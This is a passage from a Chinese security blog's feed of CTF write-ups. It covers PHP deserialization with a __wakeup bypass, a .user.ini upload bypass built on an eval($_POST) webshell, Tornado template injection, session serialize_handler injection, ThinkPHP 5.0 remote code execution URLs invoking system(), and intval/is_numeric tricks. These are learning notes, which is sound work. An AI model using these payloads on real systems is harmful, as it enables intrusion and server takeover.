&quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>发现关键代码：</p><pre><code>      function __wakeup(){          $this-&gt;username = &#39;guest&#39;;      }</code></pre><p>因此需要对__wakeup()进行绕过。<br>接下来写php代码。</p><p>&lt;?php</p><pre><code>class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username, $password)    {        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$select = new Name(&#39;admin&#39;,100);$res=serialize(@$select);echo $res;</code></pre><p><img src="/img/28.png" srcset="/img/loading.gif" alt=""></p><blockquote><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p></blockquote><h1 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h1><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。<br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1:"></a>exp1:</h2><pre><code>import  requestsurl =&quot;http://7bc3f84d-1e2f-4a49-897a-15eb4d1d5255.node3.buuoj.cn&quot;html = requests.get(url+&#39;?select=O:4:&quot;Name&quot;:3:{s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;}&#39;)print(html.text)</code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2:"></a>exp2:</h2><p> 如果不使用python提交<br>在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><blockquote><p>payload:</p></blockquote><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这一题有两个地方卡住我了，第一个是没有想到备份名叫&lt;a href=&quot;http://www.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip&lt;/a&gt;.&lt;br&gt;第二个是public、protected与private在序列化时的区别。&lt;br
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>上传绕过  .user.ini</title>
    <link href="http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/"/>
    <id>http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/</id>
    <published>2020-03-28T12:23:26.000Z</published>
    <updated>2020-03-28T12:27:01.738Z</updated>
    
    <content type="html"><![CDATA[<p>今天做了一题是BUUCTF上的checkin<br>一道文件上传题，题目首先对文件内容进行了过滤，过滤了<?因此<?php  ?>就不行了因此应该用<script language="php">eval($_POST['a']);</script>。同时这道题对文件名也过滤的死死的于是想用.htaccess但是发现没有用，后来知道该文件需要apache而这里是nginx。则需要.user.ini</p><blockquote><p>auto_prepend_file=X.jpg</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天做了一题是BUUCTF上的checkin&lt;br&gt;一道文件上传题，题目首先对文件内容进行了过滤，过滤了&lt;?因此&lt;?php  ?&gt;就不行了因此应该用&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;。同时这道题对文件名也过滤
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>easy calc</title>
    <link href="http://yoursite.com/2020/03/18/easy-calc/"/>
    <id>http://yoursite.com/2020/03/18/easy-calc/</id>
    <published>2020-03-18T10:59:58.000Z</published>
    <updated>2020-03-18T10:59:58.972Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/chrysanthemum/p/11757363.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/chrysanthemum/p/11
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>easy_tornado</title>
    <link href="http://yoursite.com/2020/03/15/easy-tornado/"/>
    <id>http://yoursite.com/2020/03/15/easy-tornado/</id>
    <published>2020-03-15T03:35:06.000Z</published>
    <updated>2020-03-15T03:52:04.843Z</updated>
    
    <content type="html"><![CDATA[<p>welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。</p><p>就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，<br>最后总体加密。同时观察hint.txt的url发现</p><pre><code>file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16</code></pre><p> 那么最终就是：</p><blockquote><blockquote><p>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</p></blockquote></blockquote><p> python脚本：</p><pre><code> import hashlibdef hash(value):    md5 = hashlib.md5(value)    md5.update(value)    result = md5.hexdigest()    return resultdef jiami():    filename = &#39;/fllllllllllllag&#39;    cookie_S = &#39;de639f1e-0c39-46e5-b8cb-1cd29f56aea3&#39;    print(hash(filename.encode(&#39;utf-8&#39;)))    x = hash(filename.encode(&#39;utf-8&#39;))    y = cookie_S +x    print(hash(y.encode(&#39;utf-8&#39;)))jiami()</code></pre><p>参考链接：<a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。&lt;/p&gt;
&lt;p&gt;就是说要通过模板注入找到cookie_secret,然后编写py
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>关于php的session.serialize_handler的问题</title>
    <link href="http://yoursite.com/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2020-03-10T03:50:59.000Z</published>
    <updated>2020-03-10T03:51:00.890Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>php的session信息是储存在文件中的</p><p>session.save_path=”” 指定储存的路径<br>session.save_handler=”” 指定储存时使用的函数（默认是file）<br>session.auto_start boolen<br>session.serialize_handler=”” 定义序列化和反序列化的处理器的名字，默认是php(5.5.4后改为php_serialize)<br>session.serialize_handler存在以下几种</p><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>php 键名+竖线（|）+经过serialize()函数处理过的值<br>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化<br>使用过程中如果想要修改，使用</p><p>ini_set(‘session.serialize_handler’,’php_serialize’);<br>但这里设置的handler如果和默认的不同，就会出问题</p><p>比如默认是php的handler，在该页面设置为php_serialize</p><p>这是如果我们传入一个 ‘|O:5:”Class”‘;,这样的一个数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以|作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p><p>CTF<br>jarvisoj PHPINFO</p><p>引用官方文档的内容</p><p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p><p>通俗的说就是请求时加上与session.upload_progress.name同名的变量时就会在$_SESSION中加上一组新的数据</p><p>来看这道题，题目给了源码</p><?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{    public $mdzz;    function __construct()    {        $this->mdzz = 'phpinfo();';    }    function __destruct()    {        eval($this->mdzz);    }}if(isset($_GET['phpinfo'])){    $m = new OowoO();}else{    highlight_string(file_get_contents('index.php'));}?><p>看到这里使用了ini_set(‘sessionserialize_handler’:’php’),有预感会出现handler不一样的问题</p><p>接下来查看phpinfo，发现php版本是5.6.21，大于5.5.4，默认的handler是php_serialize，会出现上面所述的问题</p><p>在使用session_start()时会自动加载session文件中的值，因为在这里在__destruct方法中使用eval，所以只要在session文件中写入这个类，就能够执行代码？</p><p>但是我们如何将类写入session文件？</p><p>这就用到刚才提到的东西，查看phpinfo，<br>因为session.upload_progress.enabled=1，所以我们就可以post一个和session.upload_progress.name同名的变量，来使得我们上传的文件名写入session</p><p>因为这里是php handler，是以|开头的，所以在反序列化时会按照|来识别键值对而不是按照默认的php_serialize来识别session，所以我们将文件名改为</p><p>“|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}”<br>来读取文件目录</p><p>问题<br>session部分的问题大致是解决了……剩下的问题就是……为什么要将双引号转义？暂时还没有弄清楚，待日后分析吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言&lt;br&gt;php的session信息是储存在文件中的&lt;/p&gt;
&lt;p&gt;session.save_path=”” 指定储存的路径&lt;br&gt;session.save_handler=”” 指定储存时使用的函数（默认是file）&lt;br&gt;session.auto_start bool
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP_RCE</title>
    <link href="http://yoursite.com/2020/03/08/PHP-RCE/"/>
    <id>http://yoursite.com/2020/03/08/PHP-RCE/</id>
    <published>2020-03-08T10:22:17.000Z</published>
    <updated>2020-03-08T10:24:47.722Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞利用：ThinkPHP 5.0<br>此框架存在远程代码执行漏洞<br>漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。</p><p>在controller获取控制器后，直接进行赋值，但是并没有对控制器的名进行严格的检测，导致可以使用斜杠等特殊符号来远程代码注入。</p><p>我们来搭建一下网站的环境，apache+mysql+Linux centos系统，搭建好的测试环境地址是<a href="http://127.0.01/anquan" target="_blank" rel="noopener">http://127.0.01/anquan</a> ，我们可以直接在index.php后面伪造攻击参数，示例如下：</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</a><br>通过该漏洞也可以直接远程代码注入执行phpinfo语句，查询当前的php版本，路径，扩展，以及php.ini存放的地址，都可以看得到，构造如下代码即可。</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;</a></p><p>但是我想能不能输入一句话木马，其实是可以的，但是我在攻防世界的题目中用蚁剑没有连入成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;漏洞利用：ThinkPHP 5.0&lt;br&gt;此框架存在远程代码执行漏洞&lt;br&gt;漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>图片验证码灰度化、二值化处理</title>
    <link href="http://yoursite.com/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/"/>
    <id>http://yoursite.com/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/</id>
    <published>2020-03-03T05:50:03.000Z</published>
    <updated>2020-03-03T05:52:07.110Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import tesserocrfrom PIL import Imageimage = Image.open(&#39;code2.jpg&#39;)image = image.convert(&#39;L&#39;)threshold = 127table = []for i in range(256):    if i &lt; threshold:        table.append(0)    else:        table.append(1)</code></pre><p>   二：</p><pre><code>from PIL import  Imageimport subprocessimage = Image.open(&#39;code.jpg&#39;)image = image.point(lambda x: 0 if x&lt;127 else 255)image.save(&#39;code2.jpg&#39;)subprocess.call([&quot;tesseract&quot;, &#39;code2.jpg&#39;, &quot;output&quot;])with open(&#39;output.txt&#39;, &#39;r&#39;) as f:    print(f.read())</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import tesserocr
from PIL import Image

image = Image.open(&amp;#39;code2.jpg&amp;#39;)

image = image.convert(&amp;#39;L&amp;#39;)
threshold = 1
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</title>
    <link href="http://yoursite.com/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/"/>
    <id>http://yoursite.com/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/</id>
    <published>2020-02-27T02:19:25.000Z</published>
    <updated>2020-02-27T02:19:26.587Z</updated>
    
    <content type="html"><![CDATA[<p>Intval函数获取变量整数数值<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。</p><p>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p><p>intval($req[“number”])=intval(strrev($req[“number”]))  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：number=0e-0%00</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Intval函数获取变量整数数值&lt;br&gt;Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 21474836
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
